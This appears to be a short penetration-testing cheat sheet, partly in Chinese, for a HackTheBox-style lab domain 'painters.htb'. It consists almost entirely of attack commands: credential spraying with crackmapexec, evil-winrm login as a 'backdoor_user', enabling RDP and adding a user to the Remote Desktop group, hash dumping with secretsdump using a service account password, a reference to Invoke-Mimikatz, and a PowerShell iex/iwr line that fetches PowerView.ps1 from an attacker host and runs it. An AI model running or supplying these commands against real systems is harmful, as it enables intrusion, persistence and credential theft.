#  crackmapexec

`crackmapexec winrm 192.168.110.0/24 -u 'PAINTERS.HTB\backdoor_user' -p 'P@ssw0rd123!'`


# WinRM

`evil-winrm -i 192.168.110.53 -u backdoor_user -p 'P@ssw0rd123!'`


# RDP

#### 1. 启用 RDP 服务
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0

----

#### 2. 放行防火墙中的 RDP 端口（3389）
Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

----

#### 3.  确认 RDP 服务已经启用
Get-Service -Name TermService

----

#### 4. 添加用户到 Remote Desktop Users 组
Add-LocalGroupMember -Group "Remote Desktop Users" -Member "riley"

----

xfreerdp /u:riley /p:P@ssw0rd /d:painters.htb /v:192.168.110.56 /cert:ignore

----

# Hash Dump

secretsdump.py painters.htb/web_svc:'!QAZ1qaz'@192.168.110.52

`/usr/share/windows-resources/powersploit/Exfiltration/Invoke-Mimikatz.ps1`

# PowerShell remote script

`iex (iwr http://10.10.14.3/PowerView.ps1 -UseBasicParsing)`


